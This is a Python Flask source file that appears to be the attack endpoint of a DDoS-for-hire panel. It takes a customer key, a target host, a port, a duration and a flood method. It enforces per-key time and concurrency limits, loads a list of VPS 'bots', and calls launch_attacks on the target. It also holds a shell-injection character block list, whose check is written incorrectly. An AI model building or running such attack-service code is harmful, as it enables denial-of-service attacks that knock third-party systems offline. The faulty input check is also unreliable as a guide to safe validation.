from flask import *
import json
from urllib.parse import urlparse
from funcs.validator import Validation
from routes.decorators import RouteDecorators
from funcs.launch_attack import launch_attacks
from funcs.string import sanitize, str_validation

Attack = Blueprint("Attack", __name__)

@Attack.route("/attack", methods=["GET"])
@RouteDecorators.log
@RouteDecorators.discord_webbhook_log
def index_flood():
    if 'key' in request.args and 'host' in request.args and 'port' in request.args and 'time' in request.args and 'method' in request.args:
        key = sanitize(request.args.get('key', default=None, type=str))
        host = sanitize(request.args.get('host', default=None, type=str))
        port = sanitize(request.args.get('port', default=None, type=str))
        time = sanitize(request.args.get('time', default=None, type=str))
        method = sanitize(request.args.get('method', default=None, type=str))
    else:
        return jsonify({"response_message": "Missing argument(s)."})
    
    if not all([key, host, port, time, method]):
        return jsonify({"response_message": "Missing argument(s). Null values."})
    
    with open("./data/database.json") as e:
        db = json.load(e)
    
    with open("./data/vps_servers.json") as e:
        bots = json.load(e)
    
    with open("./data/attacks.json") as e:
        dbm = json.load(e)

    if not str_validation(host):
        if [';', '|', '`', '||', '&', '&&', ',', '$', 'IFS'] not in host:
            host = host
        else:
            return jsonify({"response_message": "Error, Malcious character detected."})
    else:
        return jsonify({"response_message": "Error, Malcious character detected."})
    
    if str_validation(port):
        return jsonify({"response_message": "Error, Malcious character detected."})
    
    if str_validation(time):
        return jsonify({"response_message": "Error, Malcious character detected."})
    
    if str_validation(method):
        return jsonify({"response_message": "Error, Malicious character detected."})

    usrdata = db["keys"]
    if not usrdata.get(key):
        return jsonify({"response_message": f"Key not valid."})
    
    if Validation.ip_list_blacklist(host):
        return jsonify({"response_message": "Target is blacklisted by system."})

    if not Validation.validate_ip(host):
        if not Validation.validate_url(host):
            return jsonify({"response_message": "Target is not an Ipv4 or an URL."})
        else:
            screen_name = urlparse(host).netloc
    else:
        screen_name = host
    
    if not Validation.validate_method(method):
        return jsonify({"response_message": "Method not valid."})

    if Validation.is_valid_key(key):
        return jsonify({"response_message": f"Key has been expired or not valid."}) 
    
    if method.upper() == "STOP":
        method = method

    if not Validation.validate_port(port):
        return jsonify({"response_message": "Port should be in the range of (1-65535)."})
    
    user_maxtime = db["keys"][key]["maxTime"]
    if not Validation.validate_time(key, time):
        return jsonify({"response_message": f"Time should be MIN=10, MAX={user_maxtime}."}) 
    
    user_cons = db["keys"][key]["maxCons"]
    if db["keys"][key]["curCons"] >= db["keys"][key]["maxCons"]:
        return jsonify({"response_message": f"You've reached max concurrent limits, your limit is {user_cons}."}) 

    try:
        launch_attacks(method, host, port, time)
        db["keys"][key]["curCons"] += 1
        with open("./data/database.json", "w") as json_file:
            json.dump(db, json_file, indent=4)
        exp = db["keys"][key]["exp"]
        maxTime = db["keys"][key]["maxTime"]
        maxCons = db["keys"][key]["maxCons"]
        curCons = db["keys"][key]["curCons"]
        return jsonify({'result': {'Successfull Attack to':
        {'host': f'{host}',
        'port': f'{port}',
        'time': f'{time}',
        'method': f'{method}',
        'maxCons': f'{maxCons}',
        'curCons': f'{curCons}',
        'expired': f'{exp}'}}})
    except Exception as e:
        print(e)